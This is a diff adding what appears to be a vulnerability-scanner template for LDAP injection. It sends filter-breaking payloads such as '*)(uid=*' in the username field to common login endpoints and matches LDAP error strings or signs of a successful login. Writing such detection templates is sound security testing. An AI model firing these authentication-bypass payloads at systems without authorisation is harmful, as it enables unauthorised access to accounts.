@@ -1,0 +1,54 @@
+id: ldap-injection
+info:
+  name: LDAP Injection in Authentication Parameters
+  severity: high
+  tags: [injection, ldap, authentication, bypass, dast]
+  description: "Injects LDAP filter metacharacters into username fields of common login endpoints. LDAP error strings in the response or an unexpected authentication success both indicate the backend constructs LDAP filters directly from user input."
+  remediation: "Use parameterized LDAP queries or library functions that support prepared filters. Escape all special LDAP characters in user input before incorporating them into filter expressions."
+  cwe: "CWE-90"
+  owasp: "A03:2021-Injection"
+
+payloads:
+  payload:
+    - "*)(uid=*"
+    - "admin)(&"
+    - "*)(|(uid=*"
+    - "admin)(&(password=*)"
+    - ")(|(password=*)"
+    - "*"
+    - "*))(|(cn=*"
+
+requests:
+  - method: POST
+    paths:
+      - "/api/login"
+      - "/api/auth"
+      - "/login"
+      - "/auth"
+      - "/api/v1/login"
+      - "/api/user/login"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "username={{payload}}&password=invalid_password_probe"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "(?i)invalid ldap"
+          - "(?i)ldap.*error"
+          - "(?i)ldap.*exception"
+          - "(?i)javax\\.naming"
+          - "(?i)NamingException"
+          - "(?i)DirectoryException"
+          - "(?i)ldap_bind"
+          - "(?i)ldap_search"
+        part: body
+        condition: or
+      - type: word
+        words:
+          - "access_token"
+          - "authenticated"
+          - "dashboard"
+          - "welcome"
+        part: body
+        condition: or
